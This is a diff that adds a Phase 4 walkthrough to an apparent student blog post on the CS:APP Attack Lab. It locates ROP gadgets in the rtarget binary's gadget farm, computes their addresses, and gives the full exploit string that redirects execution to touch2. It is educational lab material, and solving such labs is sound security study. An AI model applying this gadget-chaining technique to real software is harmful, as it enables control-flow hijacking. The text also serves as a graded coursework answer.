@@ -1,6 +1,6 @@
 ---
 date: 2023-10-05 20:01
-description: Walkthrough of Attack Lab Phases 1-3 for CSCI 2400 Computer Systems
+description: Walkthrough of Attack Lab Phases 1-4 for CSCI 2400 Computer Systems
 tags: gdb, reverse-engineering, c++, csci2400, assembly
 draft: false 
 ---
@@ -319,3 +319,121 @@ NICE JOB!
 ```
 
 Phases 1-3 Complete.
+
+## Phase 4
+
+> For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your
+gadget farm. You can construct your solution using gadgets consisting of the following instruction types,
+and using only the first eight x86-64 registers (%rax–%rdi).
+* movq
+* popq
+* ret
+* nop
+
+> All the gadgets you need can be found in the region of the code for rtarget demarcated by the
+functions start_farm and mid_farm
+
+> You can do this attack with just two gadgets
+
+> When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit
+string will contain a combination of gadget addresses and data.
+
+Let us check if we can find `popq %rdi` between `start_farm` and `end_farm`
+
+The way a normal person would find the hex representation `58` to be between `start_farm` and `end_farm` is to find the line numbers for both and 
+then search between those lines. But, what if you don't want to move away from the terminal?
+
+Assuming, the disassembled code for `rtarget` is stored in `dis2.txt` (`objdump -d rtarget > dis2.txt`)
+
+```
+jovyan@jupyter-nach6988:~/lab3-attacklab-navanchauhan/target66$ sed -n '/start_farm/,/end_farm/p' dis2.txt | grep -n2 " 58"
+16-000000000040281f <getval_373>:
+17-  40281f:    f3 0f 1e fa             endbr64 
+18:  402823:    b8 d3 f5 c2 58          mov    $0x58c2f5d3,%eax
+19-  402828:    c3                      ret    
+20-
+--
+26-0000000000402834 <setval_212>:
+27-  402834:    f3 0f 1e fa             endbr64 
+28:  402838:    c7 07 58 90 c3 92       movl   $0x92c39058,(%rdi)
+29-  40283e:    c3                      ret    
+30-
+--
+41-0000000000402854 <setval_479>:
+42-  402854:    f3 0f 1e fa             endbr64 
+43:  402858:    c7 07 58 c7 7f 61       movl   $0x617fc758,(%rdi)
+44-  40285e:    c3                      ret    
+45-
+```
+
+If we were to pick the first one as our gadget, the instruction address is `0x402823`, but to get to the instruction `58` we need to add 4 bytes:
+
+`=> Gadget address = 0x402823 + 0x4 = 0x402827`
+
+The PDF already provides the next gadget we are supposed to look for `48 89 c7`
+
+```
+jovyan@jupyter-nach6988:~/lab3-attacklab-navanchauhan/target66$ sed -n '/start_farm/,/end_farm/p' dis2.txt | grep -n2 "48 89 c7"
+11-0000000000402814 <setval_253>:
+12-  402814:    f3 0f 1e fa             endbr64 
+13:  402818:    c7 07 48 89 c7 94       movl   $0x94c78948,(%rdi)
+14-  40281e:    c3                      ret    
+15-
+--
+31-000000000040283f <getval_424>:
+32-  40283f:    f3 0f 1e fa             endbr64 
+33:  402843:    b8 48 89 c7 c3          mov    $0xc3c78948,%eax
+34-  402848:    c3                      ret    
+35-
+36-0000000000402849 <setval_417>:
+37-  402849:    f3 0f 1e fa             endbr64 
+38:  40284d:    c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
+39-  402853:    c3                      ret    
+40-
+jovyan@jupyter-nach6988:~/lab3-attacklab-navanchauhan/target66$ 
+```
+
+We cannot use the first match because it is followed by `0x94` instead of `c3`, either of the next two matches will work (`0x90` is `nop` and it does nothing but increment the program counter by 1)
+
+Again, we have to account for the offset.
+
+Taking `0x402843` we need to add just 1 byte. 
+
+`=> 0x402843 + 1 = 0x402844`
+
+
+Our answer for this file is going to be:
+
+```
+padding
+gadget1
+cookie
+gadget2
+touch2
+```
+
+```bash
+jovyan@jupyter-nach6988:~/lab3-attacklab-navanchauhan/target66$ cat dis2.txt | grep touch2
+000000000040264e <touch2>:
+  402666:       74 2a                   je     402692 <touch2+0x44>
+  4026b2:       eb d4                   jmp    402688 <touch2+0x3a>
+```
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+27 28 40 00 00 00 00 00
+8f ee 8d 3e 00 00 00 00
+44 28 40 00 00 00 00 00
+4e 26 40 00 00 00 00 00
+```
+
+```shell
+jovyan@jupyter-nach6988:~/lab3-attacklab-navanchauhan/target66$ ./hex2raw < ./rtarget.l2.txt | ./rtarget 
+Cookie: 0x3e8dee8f
+Type string:Touch2!: You called touch2(0x3e8dee8f)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+```
